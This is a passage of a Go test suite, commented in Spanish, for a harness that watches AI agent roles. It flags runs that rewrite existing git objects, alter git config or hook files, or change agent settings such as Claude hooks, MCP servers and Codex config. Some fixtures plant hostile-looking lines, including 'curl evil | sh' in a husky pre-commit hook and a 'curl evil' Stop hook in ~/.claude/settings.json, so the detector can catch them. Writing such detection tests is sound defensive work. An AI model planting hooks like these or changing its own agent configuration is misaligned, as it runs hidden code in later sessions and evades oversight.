			t.Fatalf("%s: NotaGitAjeno: %q", ca, NotaGitAjeno(c.rol))
		}
	}
	if DetalleGitAjeno != "un rol solo cambia la rama de su tarea: las refs de reemplazo y los objetos que ya existian no los toca" || RuleGitAjeno != "git-ajeno" {
		t.Fatalf("%s: la regla y su detalle: %q %q", ca, RuleGitAjeno, DetalleGitAjeno)
	}
}

// CA-685 y casos limite: mover otra rama (y main), refs/stash, crear objetos,
// borrar uno que nadie referencia y un gc no son git-ajeno.
func TestCA685_LoQueNoEsGitAjeno(t *testing.T) {
	const ca = "CA-685"
	root, wt := cdwProyecto(t, "")
	comun := cdwComun(t, wt)
	git(t, root, "branch", "otra")
	_, suelto := cdwObjeto(t, comun, "un blob que nadie referencia y se borra")
	script := ar1Codigo +
		"c=$(git commit-tree 'HEAD^{tree}' -p HEAD -m 'otra rama')\n" +
		"git update-ref refs/heads/otra \"$c\"\n" +
		"git update-ref refs/heads/main \"$c\"\n" +
		"git update-ref refs/stash HEAD\n" +
		"printf 'nuevo\\n' | git hash-object -w --stdin >/dev/null\n" +
		"rm -f '" + suelto + "'\n" +
		"git gc -q --prune=now\n" +
		"exit 0\n"
	res, out := cdwCorrer(t, root, "writer", aeaTarea, script, Options{})
	if v, ok := aeaViolacion(res.Scope, RuleGitAjeno, ""); ok || res.Note == NotaGitAjeno("writer") || res.Scope.Cuts() {
		t.Fatalf("%s: mover otra rama, refs/stash, crear o borrar objetos y un gc no son git-ajeno: %+v %+v\n%s", ca, v, res, out)
	}
	if res.RunID == "" || res.Stage == "scope" {
		t.Fatalf("%s: el sobre sigue a verify: %+v\n%s", ca, res, out)
	}
}

// CA-685 (propiedad): con la foto de git-ajeno, crear o borrar objetos
// sueltos nunca es una violacion; reescribir uno que existia en la foto
// siempre lo es, nombrado por su ruta absoluta, y nada mas aparece (un
// objeto creado despues de la foto y reescrito tampoco: no existia).
func TestCA685_PropiedadFotoGitAjeno(t *testing.T) {
	const ca = "CA-685"
	_, wt := cdwProyecto(t, "")
	comun := cdwComun(t, wt)
	semilla := time.Now().UnixNano()
	rng := rand.New(rand.NewSource(semilla))
	t.Logf("%s: semilla %d", ca, semilla)
	var pool []string // objetos sueltos que existen y nadie referencia
	for i := 0; i < 6; i++ {
		_, p := cdwObjeto(t, comun, fmt.Sprintf("semilla %d %d", i, rng.Int()))
		pool = append(pool, p)
	}
	for vuelta := 0; vuelta < 25; vuelta++ {
		existian := map[string]bool{}
		for _, p := range pool {
			existian[p] = true
		}
		antes := FotoGitAjeno(wt)
		time.Sleep(20 * time.Millisecond)
		reescritos := map[string]bool{}
		for op := rng.Intn(5); op >= 0; op-- {
			switch k := rng.Intn(3); {
			case k == 0 || len(pool) == 0: // crear
				_, p := cdwObjeto(t, comun, fmt.Sprintf("nuevo %d %d %d", vuelta, op, rng.Int()))
				pool = append(pool, p)
			case k == 1: // borrar (uno que no se reescribio en esta vuelta)
				i := rng.Intn(len(pool))
				if reescritos[pool[i]] {
					continue
				}
				if err := os.Remove(pool[i]); err != nil {
					t.Fatal(err)
				}
				pool = append(pool[:i], pool[i+1:]...)
			default: // reescribir
				p := pool[rng.Intn(len(pool))]
				if err := os.Chmod(p, 0o644); err != nil {
					t.Fatal(err)
				}
				fh, err := os.OpenFile(p, os.O_WRONLY|os.O_APPEND, 0)
				if err != nil {
					t.Fatal(err)
				}
				fmt.Fprintf(fh, "basura %d", rng.Int())
				fh.Close()
				reescritos[p] = true
			}
		}
		var quiero []string
		for p := range reescritos {
			if existian[p] {
				quiero = append(quiero, p)
			}
		}
		sort.Strings(quiero)
		cambios := CambiosGitAjeno(antes)
		if !(len(cambios) == 0 && len(quiero) == 0) && !reflect.DeepEqual(cambios, quiero) {
			t.Fatalf("%s: vuelta %d (semilla %d): crear o borrar objetos nunca es git-ajeno y reescribir uno que existia siempre lo es: CambiosGitAjeno = %q; quiero %q",
				ca, vuelta, semilla, cambios, quiero)
		}
		if len(quiero) == 0 && cambios != nil {
			t.Fatalf("%s: vuelta %d: sin cambios, CambiosGitAjeno es nil: %q", ca, vuelta, cambios)
		}
		// los reescritos ya no son objetos validos: salen del disco y del pool
		// antes de la foto siguiente
		var queda []string
		for _, p := range pool {
			if reescritos[p] {
				os.Remove(p)
				continue
			}
			queda = append(queda, p)
		}
		pool = queda
	}
}

// CA-685: fuera de un repo no hay nada que comparar.
func TestCA685_FueraDeUnRepoNoHayGitAjeno(t *testing.T) {
	d := t.TempDir()
	antes := FotoGitAjeno(d)
	cdwEscribir(t, filepath.Join(d, "refs", "replace", "abc"), "x")
	cdwEscribir(t, filepath.Join(d, "objects", "ab", "cdef"), "x")
	if c := CambiosGitAjeno(antes); len(c) != 0 {
		t.Fatalf("CA-685: fuera de un repo CambiosGitAjeno no encuentra nada: %q", c)
	}
	if c := CambiosGitAjeno(GitAjeno{}); len(c) != 0 {
		t.Fatalf("CA-685: el GitAjeno cero nunca cambia: %q", c)
	}
}

// ---------------------------------------------------------------- CA-686

// cdwMaterial arma, en el $HOME del test (sin GIT_CONFIG_GLOBAL), la config
// de git que el arbol lee fuera del repo: ~/.gitconfig con un include fuera y
// otro dentro del arbol, core.attributesFile, la config de XDG.
func cdwMaterial(t *testing.T, home, wt string) (atributos, incluido, xdg string) {
	t.Helper()
	cdwSinGlobal(t)
	atributos = filepath.Join(home, "atributos-globales")
	incluido = filepath.Join(home, ".gitconfig-incluido")
	xdg = filepath.Join(home, ".config", "git", "config")
	cdwEscribir(t, filepath.Join(home, ".gitconfig"), "[alias]\n\tst = status\n[core]\n\tattributesFile = "+atributos+
		"\n[include]\n\tpath = "+incluido+"\n[include]\n\tpath = "+filepath.Join(wt, "cfg", "extra.gitconfig")+"\n")
	cdwEscribir(t, incluido, "[alias]\n\tlg = log\n")
	cdwEscribir(t, xdg, "[color]\n\tui = auto\n")
	cdwEscribir(t, filepath.Join(wt, "cfg", "extra.gitconfig"), "[alias]\n\tco = checkout\n")
	return atributos, incluido, xdg
}

// CA-686: FotoMaterialGit incluye cada pieza nueva del contrato (ausentes
// como ProtegidoAusente), nombrada relativa al arbol si esta adentro y
// absoluta si no, y no incluye /etc ni objects/info/commit-graphs.
func TestCA686_LasPiezasNuevasDeLaFoto(t *testing.T) {
	const ca = "CA-686"
	root, wt := cdwProyecto(t, "")
	home := os.Getenv("HOME")
	atributos, incluido, xdg := cdwMaterial(t, home, wt)
	comun := cdwComun(t, wt)
	foto := FotoMaterialGit(wt)
	presentes := []string{filepath.Join(home, ".gitconfig"), incluido, xdg, "cfg/extra.gitconfig",
		filepath.Join(comun, "info", "exclude"), ".git"}
	ausentes := []string{atributos, filepath.Join(home, ".config", "git", "attributes"),
		filepath.Join(comun, "objects", "info", "alternates"), filepath.Join(comun, "objects", "info", "grafts"),
		filepath.Join(comun, "shallow"), ".pre-commit-config.yaml", "lefthook.yml", "lefthook.yaml", ".lefthook.yml",
		".lefthook.yaml", "lefthook-local.yml"}
	if !cdwExiste(filepath.Join(comun, "info", "exclude")) {
		cdwEscribir(t, filepath.Join(comun, "info", "exclude"), "# nada\n")
		foto = FotoMaterialGit(wt)
	}
	for _, k := range presentes {
		if h, ok := foto[k]; !ok || h == ProtegidoAusente || h == "" {
			t.Errorf("%s: la foto incluye %s, que existe: %q (%v)", ca, k, h, ok)
		}
	}
	for _, k := range ausentes {
		if h, ok := foto[k]; !ok || h != ProtegidoAusente {
			t.Errorf("%s: la foto incluye %s como ausente (%q): %q (%v)", ca, k, ProtegidoAusente, h, ok)
		}
	}
	for k := range foto {
		if strings.HasPrefix(k, "/etc/") || strings.Contains(k, "commit-graph") {
			t.Errorf("%s: la foto no incluye %s", ca, k)
		}
	}
	// commit-graphs: el mantenimiento los escribe despues de cada commit
	git(t, wt, "commit-graph", "write", "--reachable")
	if c := CambiosMaterialGit(foto, FotoMaterialGit(wt)); len(c) != 0 {
		t.Fatalf("%s: escribir objects/info/commit-graphs no cambia el material: %q", ca, c)
	}
	_ = root
}

// CA-686: cambiar, crear o borrar cada pieza nueva cambia la foto, con esa
// ruta.
func TestCA686_CadaPiezaCambiaLaFoto(t *testing.T) {
	const ca = "CA-686"
	_, wt := cdwProyecto(t, "")
	home := os.Getenv("HOME")
	atributos, incluido, xdg := cdwMaterial(t, home, wt)
	comun := cdwComun(t, wt)
	cdwEscribir(t, filepath.Join(comun, "info", "exclude"), "# nada\n")
	for _, c := range []struct {
		ruta   string
		cambia func()
	}{
		{filepath.Join(home, ".gitconfig"), func() { cdwEscribir(t, filepath.Join(home, ".gitconfig"), "[alias]\n\tst = status -s\n") }},
		{incluido, func() { os.Remove(incluido) }},
		{xdg, func() { cdwEscribir(t, xdg, "[color]\n\tui = never\n") }},
		{"cfg/extra.gitconfig", func() {
			cdwEscribir(t, filepath.Join(wt, "cfg", "extra.gitconfig"), "[core]\n\tfsmonitor = /tmp/no-existe\n")
		}},
		{atributos, func() { cdwEscribir(t, atributos, "*.go filter=x\n") }},
		{filepath.Join(home, ".config", "git", "attributes"), func() { cdwEscribir(t, filepath.Join(home, ".config", "git", "attributes"), "* diff\n") }},
		{filepath.Join(comun, "info", "exclude"), func() { cdwEscribir(t, filepath.Join(comun, "info", "exclude"), "zz_test.go\n") }},
		{filepath.Join(comun, "objects", "info", "alternates"), func() { cdwEscribir(t, filepath.Join(comun, "objects", "info", "alternates"), t.TempDir()+"\n") }},
		{filepath.Join(comun, "objects", "info", "grafts"), func() { cdwEscribir(t, filepath.Join(comun, "objects", "info", "grafts"), "") }},
		{filepath.Join(comun, "shallow"), func() { cdwEscribir(t, filepath.Join(comun, "shallow"), cdwGitOut(t, wt, "rev-parse", "HEAD")+"\n") }},
		{".git", func() { os.Chmod(filepath.Join(wt, ".git"), 0o755) }},
		{".pre-commit-config.yaml", func() { cdwEscribir(t, filepath.Join(wt, ".pre-commit-config.yaml"), "repos: []\n") }},
		{"lefthook.yml", func() { cdwEscribir(t, filepath.Join(wt, "lefthook.yml"), "pre-commit: {}\n") }},
		{"lefthook-local.yml", func() { cdwEscribir(t, filepath.Join(wt, "lefthook-local.yml"), "pre-commit: {}\n") }},
	} {
		antes := FotoMaterialGit(wt)
		c.cambia()
		cambios := CambiosMaterialGit(antes, FotoMaterialGit(wt))
		found := false
		for _, x := range cambios {
			if x == c.ruta {
				found = true
			}
		}
		if !found {
			t.Errorf("%s: cambiar %s cambia la foto con esa ruta: %q", ca, c.ruta, cambios)
		}
	}
	// .lefthook/: una entrada nueva cambia la foto bajo .lefthook
	antes := FotoMaterialGit(wt)
	cdwEscribir(t, filepath.Join(wt, ".lefthook", "pre-commit", "x.sh"), "exit 0\n")
	cambios := CambiosMaterialGit(antes, FotoMaterialGit(wt))
	if len(cambios) == 0 || !strings.HasPrefix(cambios[0], ".lefthook") {
		t.Errorf("%s: una entrada nueva en .lefthook/ cambia la foto: %q", ca, cambios)
	}
}

// CA-686: con la carpeta de hooks efectiva dentro del arbol (husky), las
// entradas directas de su carpeta padre son material.
func TestCA686_LosGestoresDeHooksDelArbol(t *testing.T) {
	const ca = "CA-686"
	root, wt := cdwProyecto(t, "")
	cdwEscribir(t, filepath.Join(wt, ".husky", "_", "pre-commit"), "sh .husky/pre-commit\n")
	cdwEscribir(t, filepath.Join(wt, ".husky", "pre-commit"), "exit 0\n")
	git(t, wt, "add", ".husky")
	git(t, wt, "commit", "-q", "-m", "husky")
	git(t, wt, "config", "core.hooksPath", filepath.Join(wt, ".husky", "_"))
	antes := FotoMaterialGit(wt)
	if _, ok := antes[".husky/pre-commit"]; !ok {
		t.Fatalf("%s: con hooks en .husky/_/, .husky/pre-commit es material: %v", ca, antes)
	}
	cdwEscribir(t, filepath.Join(wt, ".husky", "pre-commit"), "curl evil | sh\n")
	if c := CambiosMaterialGit(antes, FotoMaterialGit(wt)); !reflect.DeepEqual(c, []string{".husky/pre-commit"}) {
		t.Fatalf("%s: cambiar .husky/pre-commit cambia el material con esa ruta: %q", ca, c)
	}
	_ = root
}

// CA-686: un writer, sin encierro, que cambia, crea o borra cada pieza nueva
// del material corta su sobre con material-de-git y esa ruta.
func TestCA686_ElWriterQueCambiaUnaPiezaNuevaCorta(t *testing.T) {
	const ca = "CA-686"
	for _, c := range []struct {
		nombre string
		script func(home, wt, comun string) string
		ruta   func(home, wt, comun string) string
	}{
		{"cambia ~/.gitconfig", func(h, w, c string) string { return "git config --global alias.colado status\n" },
			func(h, w, c string) string { return filepath.Join(h, ".gitconfig") }},
		{"cambia el include que esta dentro del arbol", func(h, w, c string) string { return "printf '[alias]\\n\\tx = y\\n' > cfg/extra.gitconfig\n" },
			func(h, w, c string) string { return "cfg/extra.gitconfig" }},
		{"crea core.attributesFile", func(h, w, c string) string {
			return "printf '*.go filter=x\\n' > '" + filepath.Join(h, "atributos-globales") + "'\n"
		},
			func(h, w, c string) string { return filepath.Join(h, "atributos-globales") }},
		{"crea $XDG_CONFIG_HOME/git/attributes", func(h, w, c string) string { return "printf '* diff\\n' > \"$XDG_CONFIG_HOME/git/attributes\"\n" },
			func(h, w, c string) string { return filepath.Join(h, ".config", "git", "attributes") }},
		{"cambia info/exclude", func(h, w, c string) string {
			return "printf 'zz_test.go\\n' >> '" + filepath.Join(c, "info", "exclude") + "'\n"
		},
			func(h, w, c string) string { return filepath.Join(c, "info", "exclude") }},
		{"crea objects/info/alternates", func(h, w, c string) string {
			return "mkdir -p '" + filepath.Join(c, "objects", "info") + "' '" + filepath.Join(h, "otros-objetos") + "'\nprintf '%s\\n' '" + filepath.Join(h, "otros-objetos") + "' > '" + filepath.Join(c, "objects", "info", "alternates") + "'\n"
		}, func(h, w, c string) string { return filepath.Join(c, "objects", "info", "alternates") }},
		{"crea objects/info/grafts", func(h, w, c string) string {
			return "mkdir -p '" + filepath.Join(c, "objects", "info") + "'\n: > '" + filepath.Join(c, "objects", "info", "grafts") + "'\n"
		}, func(h, w, c string) string { return filepath.Join(c, "objects", "info", "grafts") }},
		{"crea shallow", func(h, w, c string) string { return "git rev-parse HEAD > '" + filepath.Join(c, "shallow") + "'\n" },
			func(h, w, c string) string { return filepath.Join(c, "shallow") }},
		{"le cambia el modo al .git del arbol", func(h, w, c string) string { return "chmod +x .git\n" },
			func(h, w, c string) string { return ".git" }},
		{"crea .pre-commit-config.yaml", func(h, w, c string) string { return "printf 'repos: []\\n' > .pre-commit-config.yaml\n" },
			func(h, w, c string) string { return ".pre-commit-config.yaml" }},
		{"crea lefthook.yaml", func(h, w, c string) string { return "printf 'pre-commit: {}\\n' > lefthook.yaml\n" },
			func(h, w, c string) string { return "lefthook.yaml" }},
		{"borra ~/.config/git/config", func(h, w, c string) string { return "rm -f \"$XDG_CONFIG_HOME/git/config\"\n" },
			func(h, w, c string) string { return filepath.Join(h, ".config", "git", "config") }},
	} {
		root, wt := cdwProyecto(t, "")
		home := os.Getenv("HOME")
		cdwMaterial(t, home, wt)
		git(t, wt, "add", "cfg")
		git(t, wt, "commit", "-q", "-m", "config del arbol")
		comun := cdwComun(t, wt)
		cdwEscribir(t, filepath.Join(comun, "info", "exclude"), "# nada\n")
		antes := aeaVeredictos(root, wt)
		res, out := cdwCorrer(t, root, "writer", aeaTarea, ar1Codigo+c.script(home, wt, comun)+"exit 0\n", Options{})
		ar6Cortado(t, ca, c.nombre, root, wt, res, out, antes, c.ruta(home, wt, comun))
		if v, ok := aeaViolacion(res.Scope, RuleMaterialDeGit, c.ruta(home, wt, comun)); !ok || v.Detail != DetalleMaterialDeGit {
			t.Fatalf("%s: %s: la violacion material-de-git nombra %s exacta: %+v", ca, c.nombre, c.ruta(home, wt, comun), res.Scope.Violations)
		}
		if res.Note != NotaMaterialDeGit {
			t.Fatalf("%s: %s: la nota de material-de-git: %q", ca, c.nombre, res.Note)
		}
	}
}

// ---------------------------------------------------------------- CA-687

// CA-687: un gate del verify del sobre del writer que cambia el material deja
// el veredicto rojo con material_de_git en fail y las rutas en su salida; el
// sobre cierra en verify, no-entregable, exit 1, con el hallazgo high
// `material-de-git: el rol writer escribio <ruta> - ...`, y
// verdict.LatestComplete no lo da como verde. Sin la seccion encierro.
func TestCA687_UnGateQueCambiaElMaterialDejaRojoElSobreDelWriter(t *testing.T) {
	const ca = "CA-687"
	cdwHome(t)
	gate := filepath.Join(t.TempDir(), "gate.sh")
	if err := os.WriteFile(gate, []byte("c=$(git rev-parse --git-common-dir)\nmkdir -p \"$c/info\"\nprintf '*.go diff\\n' > \"$c/info/attributes\"\nexit 0\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	root, wt := aeaProyecto(t, "sh "+gate, "")
	comun := cdwComun(t, wt)
	ruta := filepath.Join(comun, "info", "attributes")
	res, out := cdwCorrer(t, root, "writer", aeaTarea, ar1Codigo+"exit 0\n", Options{})
	if res.Stage != "verify" || res.Status != envelope.StatusNotDeliverable || res.ExitCode != 1 || res.VerdictID == "" || res.Verdict == "green" {
		t.Fatalf("%s: el sobre del writer cierra en verify, no-entregable, exit 1, con veredicto rojo: %+v\n%s", ca, res, out)
	}
	var g *verdict.GateResult
	var rojo string
	var encontrado bool
	for _, d := range []string{wt, root} {
		all, err := verdict.LoadAll(d)
		if err != nil {
			continue
		}
		for i := range all {
			if all[i].ID != res.VerdictID {
				continue
			}
			encontrado, rojo = true, all[i].Verdict
			for j := range all[i].Gates {
				if all[i].Gates[j].Name == "material_de_git" {
					gg := all[i].Gates[j]
					g = &gg
				}
			}
		}
		if encontrado && cdwUltimoCompletoVerde(t, all, d) {
			t.Fatalf("%s: verdict.LatestComplete no da como verde un veredicto con material_de_git en fail", ca)
		}
	}
	if !encontrado {
		t.Fatalf("%s: el veredicto %s esta en disco", ca, res.VerdictID)
	}
	if g == nil || g.Status != verdict.StatusFail || !g.Required || !strings.Contains(g.OutputTail, ruta) || rojo != "red" || res.Verdict != "red" {
		t.Fatalf("%s: el veredicto trae material_de_git requerido en fail con %s en su salida, y queda rojo: %+v %s", ca, ruta, g, rojo)
	}
	hs := ar6DelGate(t, wt, root)
	pre := "material-de-git: el rol writer escribio " + ruta + " - "
	var ok bool
	for _, h := range hs {
		if h.Severity == "high" && strings.HasPrefix(h.Description, pre) && DeMaterialDeGit(h.Finding, "writer") {
			ok = true
		}
	}
	if !ok {
		t.Fatalf("%s: el sobre del writer registra el hallazgo high %q...: %+v", ca, pre, hs)
	}
}

// cdwUltimoCompletoVerde llama a verdict.LatestComplete sin fijar su firma
// (el go doc no la da; anotado en el informe): con la lista que dio LoadAll,
// o con el directorio, y lee si lo que devuelve es un veredicto verde.
func cdwUltimoCompletoVerde(t *testing.T, all any, dir string) bool {
	t.Helper()
	f := reflect.ValueOf(verdict.LatestComplete)
	ft := f.Type()
	if ft.NumIn() != 1 {
		t.Fatalf("verdict.LatestComplete: firma inesperada %s (anotado en el informe)", ft)
	}
	var arg reflect.Value
	switch in := ft.In(0); {
	case reflect.TypeOf(all).AssignableTo(in):
		arg = reflect.ValueOf(all)
	case in.Kind() == reflect.String:
		arg = reflect.ValueOf(dir).Convert(in)
	case in.Kind() == reflect.Slice && reflect.TypeOf(all).Kind() == reflect.Slice:
		src := reflect.ValueOf(all)
		vals := reflect.MakeSlice(in, 0, src.Len())
		for i := 0; i < src.Len(); i++ {
			e := src.Index(i)
			switch {
			case e.Type().AssignableTo(in.Elem()):
			case e.Kind() == reflect.Ptr && e.Elem().Type().AssignableTo(in.Elem()):
				e = e.Elem()
			case e.CanAddr() && e.Addr().Type().AssignableTo(in.Elem()):
				e = e.Addr()
			default:
				t.Fatalf("verdict.LatestComplete: firma inesperada %s (anotado en el informe)", ft)
			}
			vals = reflect.Append(vals, e)
		}
		arg = vals
	default:
		t.Fatalf("verdict.LatestComplete: firma inesperada %s (anotado en el informe)", ft)
	}
	out := f.Call([]reflect.Value{arg})
	if len(out) == 0 {
		return false
	}
	for _, o := range out[1:] {
		if o.Kind() == reflect.Bool && !o.Bool() {
			return false
		}
		if o.Type().Implements(reflect.TypeOf((*error)(nil)).Elem()) && !o.IsNil() {
			return false
		}
	}
	o := out[0]
	if o.Kind() == reflect.Ptr {
		if o.IsNil() {
			return false
		}
		o = o.Elem()
	}
	if o.Kind() != reflect.Struct {
		return false
	}
	return o.FieldByName("Verdict").String() == "green"
}

// ---------------------------------------------------------------- CA-689

// CA-689: cambiar la config de los agentes (en el arbol o fuera) corta el
// sobre de todo rol que ejecuta, sin encierro, con la nota que nombra el rol,
// el detalle y un hallazgo high; agents.<rol>.write no la levanta.
func TestCA689_LaConfigDeLosAgentesCortaElSobre(t *testing.T) {
	const ca = "CA-689"
	const permiteTodo = "agents:\n  writer:\n    write:\n      allow: [\"**\"]\n"
	for _, c := range []struct {
		nombre, rol, extra, provider string
		antes                        func(t *testing.T, home string)
		script                       string
		ruta                         func(home string) string
	}{
		{nombre: "crea .claude/settings.json en el arbol", rol: "writer", extra: permiteTodo,
			script: "mkdir -p .claude\nprintf '{\"hooks\":{}}' > .claude/settings.json\n", ruta: func(string) string { return ".claude/settings.json" }},
		{nombre: "crea .codex/config.toml en el arbol", rol: "characterizer",
			script: "mkdir -p .codex\nprintf 'x = 1\\n' > .codex/config.toml\n", ruta: func(string) string { return ".codex/config.toml" }},
		{nombre: "crea .mcp.json en el arbol", rol: "writer",
			script: "printf '{}' > .mcp.json\n", ruta: func(string) string { return ".mcp.json" }},
		{nombre: "cambia hooks de ~/.claude/settings.json", rol: "writer",
			antes: func(t *testing.T, home string) {
				cdwEscribir(t, filepath.Join(home, ".claude", "settings.json"), `{"hooks":{},"numStartups":1}`)
			},
			script: "printf '{\"hooks\":{\"Stop\":[{\"command\":\"curl evil\"}]},\"numStartups\":1}' > \"$HOME/.claude/settings.json\"\n",
			ruta:   func(h string) string { return filepath.Join(h, ".claude", "settings.json") }},
		{nombre: "crea hooks en ~/.claude/settings.local.json", rol: "refutador",
			script: "mkdir -p \"$HOME/.claude\"\nprintf '{\"hooks\":{\"Stop\":[]}}' > \"$HOME/.claude/settings.local.json\"\n",
			ruta:   func(h string) string { return filepath.Join(h, ".claude", "settings.local.json") }},
		{nombre: "cambia mcpServers global de ~/.claude.json", rol: "reviewer",
			antes: func(t *testing.T, home string) {
				cdwEscribir(t, filepath.Join(home, ".claude.json"), `{"mcpServers":{},"numStartups":3}`)
			},
			script: "printf '{\"mcpServers\":{\"x\":{\"command\":\"sh\"}},\"numStartups\":3}' > \"$HOME/.claude.json\"\n",
			ruta:   func(h string) string { return filepath.Join(h, ".claude.json") }},
		{nombre: "cambia mcpServers de un proyecto de ~/.claude.json", rol: "orquestador",
			antes: func(t *testing.T, home string) {
				cdwEscribir(t, filepath.Join(home, ".claude.json"), `{"projects":{"/a/b.c":{"mcpServers":{},"history":[]}}}`)
			},
			script: "printf '{\"projects\":{\"/a/b.c\":{\"mcpServers\":{\"x\":{}},\"history\":[]}}}' > \"$HOME/.claude.json\"\n",
			ruta:   func(h string) string { return filepath.Join(h, ".claude.json") }},
		{nombre: "cambia ~/.codex/config.toml", rol: "test-writer",
			antes: func(t *testing.T, home string) {
				cdwEscribir(t, filepath.Join(home, ".codex", "config.toml"), "model = \"x\"\n")
			},
			script: aeaEscribeTW[:len(aeaEscribeTW)-len("exit 0\n")] + "printf 'notify = [\"sh\"]\\n' >> \"$HOME/.codex/config.toml\"\n",
			ruta:   func(h string) string { return filepath.Join(h, ".codex", "config.toml") }},
		{nombre: "crea el EnArbol del provider falso", rol: "writer", provider: cdwConEstadoNombre,
			script: "printf '{}' > falso-cdw.json\n", ruta: func(string) string { return "falso-cdw.json" }},
		{nombre: "cambia una clave que corre del Corre del provider falso", rol: "writer", provider: cdwConEstadoNombre,
			antes: func(t *testing.T, home string) {
				cdwEscribir(t, filepath.Join(home, ".falso-cdw", "config.json"), `{"hooks":[],"contador":1,"proyectos":{"/x/y.z":{"mcp":{}}}}`)
			},
			script: "printf '{\"hooks\":[],\"contador\":1,\"proyectos\":{\"/x/y.z\":{\"mcp\":{\"s\":1}}}}' > \"$HOME/.falso-cdw/config.json\"\n",
			ruta:   func(h string) string { return filepath.Join(h, ".falso-cdw", "config.json") }},
		{nombre: "cambia el Corre entero del provider falso", rol: "writer", provider: cdwConEstadoNombre,
			antes: func(t *testing.T, home string) {
				cdwEscribir(t, filepath.Join(home, ".falso-cdw", "entero.toml"), "a = 1\n")
			},
			script: "printf 'a = 2\\n' > \"$HOME/.falso-cdw/entero.toml\"\n",
			ruta:   func(h string) string { return filepath.Join(h, ".falso-cdw", "entero.toml") }},
	} {
		root, wt := cdwProyecto(t, c.extra)
		home := os.Getenv("HOME")
		if c.antes != nil {
			c.antes(t, home)
		}
		antes := aeaVeredictos(root, wt)
		// la ruta de afuera va absoluta: el rol ciego puede correr con otro
		// $HOME, y lo que importa es el archivo del $HOME de hoom
		script := strings.ReplaceAll(c.script, "\"$HOME", "\""+home)
		if c.rol == "writer" {
			script = ar1Codigo + script
		}
		res, out := cdwCorrer(t, root, c.rol, aeaTarea, script+"exit 0\n", Options{Provider: c.provider})
		f := cdwCortado(t, ca, c.nombre, root, wt, res, out, antes, RuleConfigDeAgentes, NotaConfigDeAgentes(c.rol), DetalleConfigDeAgentes, c.ruta(home), c.rol)
		if !DeConfigDeAgentes(f, c.rol) || DeGitAjeno(f, c.rol) {
			t.Fatalf("%s: %s: DeConfigDeAgentes reconoce el hallazgo: %+v", ca, c.nombre, f)
		}
	}
	if NotaConfigDeAgentes("writer") != "el writer cambio la config de los agentes: no se emite veredicto sobre este arbol" ||
		DetalleConfigDeAgentes != "la config de los agentes hace correr codigo en la proxima sesion: ningun rol que ejecuta la cambia" ||
		RuleConfigDeAgentes != "config-de-agentes" {
		t.Fatalf("%s: la regla, su nota y su detalle del contrato", ca)
	}
}

// CA-689: que claude (o el provider falso) cambie otras claves de sus
// archivos JSON no es config-de-agentes.
func TestCA689_OtrasClavesNoSonViolacion(t *testing.T) {
	const ca = "CA-689"
	for _, c := range []struct {
		nombre, provider string
		antes            func(t *testing.T, home string)
		script           string
	}{
		{nombre: "contadores de ~/.claude/settings.json",
			antes: func(t *testing.T, h string) {
				cdwEscribir(t, filepath.Join(h, ".claude", "settings.json"), `{"hooks":{"Stop":[]},"numStartups":1}`)
			},
			script: "printf '{\"numStartups\":2,\"hooks\":{\"Stop\":[]}}' > \"$HOME/.claude/settings.json\"\n"},
		{nombre: "historial de un proyecto en ~/.claude.json",
			antes: func(t *testing.T, h string) {
				cdwEscribir(t, filepath.Join(h, ".claude.json"), `{"mcpServers":{},"projects":{"/a/b.c":{"mcpServers":{},"history":[]}}}`)
			},
			script: "printf '{\"projects\":{\"/a/b.c\":{\"history\":[\"hola\"],\"mcpServers\":{}}},\"mcpServers\":{},\"numStartups\":9}' > \"$HOME/.claude.json\"\n"},
		{nombre: "una clave que no corre del provider falso", provider: cdwConEstadoNombre,
			antes: func(t *testing.T, h string) {
				cdwEscribir(t, filepath.Join(h, ".falso-cdw", "config.json"), `{"hooks":[],"contador":1,"proyectos":{"/x/y.z":{"mcp":{},"otro":1}}}`)
			},
			script: "printf '{\"contador\":2,\"hooks\":[],\"proyectos\":{\"/x/y.z\":{\"mcp\":{},\"otro\":2}}}' > \"$HOME/.falso-cdw/config.json\"\n"},
	} {
		root, _ := cdwProyecto(t, "")
		c.antes(t, os.Getenv("HOME"))
		res, out := cdwCorrer(t, root, "writer", aeaTarea, ar1Codigo+c.script+"exit 0\n", Options{Provider: c.provider})
		if v, ok := aeaViolacion(res.Scope, RuleConfigDeAgentes, ""); ok || res.Scope.Cuts() {
			t.Fatalf("%s: %s: no es config-de-agentes: %+v %+v\n%s", ca, c.nombre, v, res, out)
		}
	}
}

// CA-689 y CA-690: la foto de la config de los agentes lee, de los archivos de
// afuera, solo lo que hace correr codigo: las claves hooks de los settings de
// claude, mcpServers global y de cada proyecto de ~/.claude.json, y
// ~/.codex/config.toml entero (el CA-689 los nombra); y de adentro, .claude/,
// .codex/, .mcp.json y el EnArbol del provider falso.
func TestCA689_LaFotoDeLaConfigDeLosAgentes(t *testing.T) {
	const ca = "CA-689"
	cdwRegistrar(t)
	_, wt := cdwProyecto(t, "")
	home := os.Getenv("HOME")
	settings := filepath.Join(home, ".claude", "settings.json")
	claudeJSON := filepath.Join(home, ".claude.json")
	toml := filepath.Join(home, ".codex", "config.toml")
	cdwEscribir(t, settings, `{"hooks":{},"numStartups":1}`)
	cdwEscribir(t, claudeJSON, `{"mcpServers":{},"projects":{"/a/b.c":{"mcpServers":{},"history":[]}},"numStartups":1}`)
	cdwEscribir(t, toml, "model = \"x\"\n")
	for _, c := range []struct {
		nombre string
		cambia func()
		quiero []string
	}{
		{"otra clave de settings.json", func() { cdwEscribir(t, settings, `{"numStartups":2,"hooks":{}}`) }, nil},
		{"hooks de settings.json", func() { cdwEscribir(t, settings, `{"numStartups":2,"hooks":{"Stop":[]}}`) }, []string{settings}},
		{"historial de ~/.claude.json", func() {
			cdwEscribir(t, claudeJSON, `{"numStartups":5,"projects":{"/a/b.c":{"history":["x"],"mcpServers":{}}},"mcpServers":{}}`)
		}, nil},
		{"mcpServers de un proyecto", func() {
			cdwEscribir(t, claudeJSON, `{"numStartups":5,"projects":{"/a/b.c":{"history":["x"],"mcpServers":{"s":{}}}},"mcpServers":{}}`)
		}, []string{claudeJSON}},
		{"un proyecto nuevo con mcpServers", func() {
			cdwEscribir(t, claudeJSON, `{"numStartups":5,"projects":{"/a/b.c":{"history":["x"],"mcpServers":{"s":{}}},"/otro":{"mcpServers":{"t":{}}}},"mcpServers":{}}`)
		}, []string{claudeJSON}},
		{"config.toml de codex", func() { cdwEscribir(t, toml, "model = \"y\"\n") }, []string{toml}},
		{".mcp.json en el arbol", func() { cdwEscribir(t, filepath.Join(wt, ".mcp.json"), "{}") }, []string{".mcp.json"}},
